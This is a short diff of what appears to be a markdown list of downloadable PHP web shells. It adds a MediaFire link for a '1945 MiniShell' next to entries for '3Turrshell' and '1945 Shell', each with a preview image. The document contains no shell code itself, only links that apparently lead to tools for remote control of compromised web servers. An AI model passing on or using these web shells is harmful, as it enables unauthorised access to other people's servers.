@@ -916,7 +916,10 @@ Date : 10 January 2023 [![Windows Badge](https://img.shields.io/badge/Windows-bl
 
 # <a href="https://www.mediafire.com/file/m6q0cziet6oc5kg/3Turrshell.php/file"> 3Turrshell </a> 
 <img src="https://i.imgur.com/4Hs9jPs.png" alt="beruangsalju profile">
-	
+
+# <a href="https://www.mediafire.com/file/ibh2q9odayfsg1z/1945mini.php/file"> 1945 MiniShell </a> 
+<img src="https://i.imgur.com/YUufSXg.png" alt="beruangsalju profile">
+
 # <a href="https://www.mediafire.com/file/68lc5b901vvz074/1945.php/file"> 1945 Shell </a> 
 <img src="https://i.imgur.com/Qd1iUtM.png" alt="beruangsalju profile">
 	
